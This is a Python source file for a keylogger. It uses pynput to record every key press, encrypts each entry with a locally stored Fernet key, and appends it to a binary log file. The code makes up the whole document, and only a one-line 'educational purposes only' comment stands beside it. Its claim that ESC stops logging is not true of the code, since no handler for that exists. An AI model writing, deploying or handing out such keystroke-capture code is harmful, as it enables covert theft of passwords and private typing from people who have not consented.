# keylogger_encrypted.py

from pynput import keyboard
from cryptography.fernet import Fernet
import base64
import os
import datetime

# ====== 1. Generate or load encryption key ======
def load_or_create_key():
    key_file = "secret.key"
    if os.path.exists(key_file):
        with open(key_file, "rb") as f:
            return f.read()
    else:
        key = Fernet.generate_key()
        with open(key_file, "wb") as f:
            f.write(key)
        return key

key = load_or_create_key()
cipher = Fernet(key)

# ====== 2. Log file path ======
log_file = "keystrokes.log"

# ====== 3. Store and encrypt keystrokes ======
def encrypt_and_store(key_data):
    timestamp = str(datetime.datetime.now())
    data = f"{timestamp} - {key_data}\n"
    encrypted = cipher.encrypt(data.encode())
    with open("encrypted_log.bin", "ab") as f:
        f.write(encrypted + b"\n")

# ====== 4. Key press handler ======
def on_press(key):
    try:
        if hasattr(key, 'char'):
            encrypt_and_store(key.char)
        else:
            encrypt_and_store(str(key))
    except Exception as e:
        encrypt_and_store(f"[ERROR] {e}")

# ====== 5. Start listening ======
with keyboard.Listener(on_press=on_press) as listener:
    print("[*] Keylogger running... Press ESC to stop.")
    listener.join()
# Note: This code is for educational purposes only. Use responsibly and ethically.
    print("\n") 